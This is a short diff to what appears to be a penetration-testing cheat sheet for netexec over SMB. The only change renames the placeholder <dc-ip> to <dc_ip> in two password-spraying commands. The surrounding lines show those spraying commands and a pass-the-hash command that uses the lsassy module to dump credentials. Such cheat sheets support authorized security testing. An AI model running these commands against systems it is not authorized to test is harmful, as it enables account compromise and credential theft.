@@ -200,7 +200,7 @@ netexec smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True N
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 
 
 ```bash
-netexec smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
+netexec smb <dc_ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
 ```
 
 ## netexec - password spray multiple test 
@@ -209,7 +209,7 @@ netexec smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-o
 (careful on lockout)
 
 ```bash
-netexec smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
+netexec smb <dc_ip> -u <user.txt> -p <password.txt> --continue-on-success
 ```
 
 ## netexec - put file
